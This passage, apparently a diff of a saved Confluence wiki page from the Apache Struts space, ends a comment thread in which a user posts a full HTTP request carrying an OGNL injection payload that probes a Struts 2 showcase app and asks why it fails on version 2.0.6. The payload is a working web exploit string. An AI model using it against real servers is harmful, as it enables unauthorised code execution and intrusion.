+                                                              <li class="first comment-date"><a title="三月 26, 2013 05:15" href="javascript:;"><span>三月 26, 2013</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-30759477"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+    </li>
+                        </ol>
+    </li>
+                    <li id="comment-thread-30759475" class="comment-thread">
+        <div class="comment  " id="comment-30759475">
+        <p class="comment-user-logo">
+            <img class="userLogo logo anonymous" src="static/picture/anonymous.svg" alt="用户图标: rmn190" title="rmn190">        </p>
+        <div class="comment-header">
+            <h4 class="author">    <a href="javascript:;" class="url fn">rmn190</a> 发表：</h4>
+        </div>
+        <div class="comment-body">
+            <div class="comment-content wiki-content">
+                <p>with folloing http package, </p>
+
+<p>GET /struts2-showcase-2.0.6/validation/submitFieldValidatorsExamples.action;jsessionid=94F890877E7F79CFF505D3166F099E56?requiredValidatorField=(%23context<a class="unresolved" href="#">'xwork.MethodAccessor.denyMethodExecution'</a>=false,%23_memberAccess<a class="unresolved" href="#">'allowStaticMethodAccess'</a>=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23rep=@org.apache.struts2.ServletActionContext@getResponse(),%23webStr=new%20byte<a class="unresolved" href="#">51020</a>,%23rep.getWriter().println(new%20java.lang.StringBuilder(%22tfavodrisy%22).append(%22~<sub>not_exist_in_html</sub><sub>%22).append(%23req.getRealPath(%22%2F%22)).append(%22~3.1415621</sub>%22).toString()))(iydx)&amp;z<a class="unresolved" href="#">%28requiredValidatorField%29%28%27iydx%27%29</a>=true HTTP/1.1<br>
+Accept-Encoding: identity<br>
+Host: darksalmon.net<br>
+Connection: close<br>
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)</p>
+
+
+<p>it failed, and struts version is 2.0.6, but when I tested it with 2.3.1.1, it worked well, so would you give some point about the reason why it failed? </p>
+            </div>
+            <div class="comment-actions">
+                                                <ul class="comment-actions-secondary">
+                                                              <li class="first comment-permalink"><a title="指向此评论的永久链接" href="javascript:;" id="comment-permalink-30759475"><span>永久链接</span></a></li>
+            </ul>
+                                    <ul class="comment-actions-primary">
+                                                              <li class="first comment-date"><a title="三月 26, 2013 05:11" href="javascript:;"><span>三月 26, 2013</span></a></li>
+                                                              <li class=" "><a href="javascript:;" id="delete-all-comments-link-comment-link-30759475"><span>Delete comments</span></a></li>
+            </ul>
+                </div>
+        </div>
+    </div>
+
+    
+    </li>
+            </ol>
+
+
+</div>
+        
+
+
+                
+    
+            
+</div>
+
+    
+
+    
+
+
+
+
+    
+    
+
+    
+    
+    
+
+
+    
+<div id="space-tools-web-items" class="hidden">
+                <div data-label="概览" data-href="/confluence/spaces/viewspacesummary.action?key=WW">概览</div>
+            <div data-label="内容工具" data-href="/confluence/pages/reorderpages.action?key=WW">内容工具</div>
+            <div data-label="应用" data-href="/confluence/spaces/snippeterrors.action?key=WW">应用</div>
+    </div>
+        
+
+
+
+            </div><!-- \#main -->
+            
+    
+    
+        
+            
+            
+
+<div id="footer" role="contentinfo">
+    <section class="footer-body">
+
+                                                            <p class="license license-opensource">
+                    本站点免费授予 Apache Software Foundation<b> Atlassian Confluence 开源项目授权</b>。<a href="javascript:;">今天开始评估 Confluence</a>。<br>
+                </p>
+                    
+        
+
+        <ul id="poweredby">
+            <li class="noprint">基于 <a href="javascript:;" class="hover-footer-link" rel="nofollow">Atlassian Confluence</a> <span id='footer-build-information'>7.5.0</span> 技术构建</li>
+            <li class="print-only">由 Atlassian 合流7.5.0 打印</li>
+            <li class="noprint"><a href="javascript:;" class="hover-footer-link" rel="nofollow">报告缺陷</a></li>
+            <li class="noprint"><a href="javascript:;" class="hover-footer-link" rel="nofollow">Atlassian 新闻</a></li>
+        </ul>
+
+        
+
+        <div id="footer-logo"><a href="javascript:;" rel="nofollow">Atlassian</a></div>
+
+                    
+        
+    </section>
+</div>
+
+    
+</div>
+
+</div><!-- \#full-height-container -->
+</div><!-- \#page -->
+
+    <span style="display:none;" id="confluence-server-performance">{"serverDuration": 171, "requestCorrelationId": "c42d9614afe0a191"}</span>
+</body>
+</html>
+    
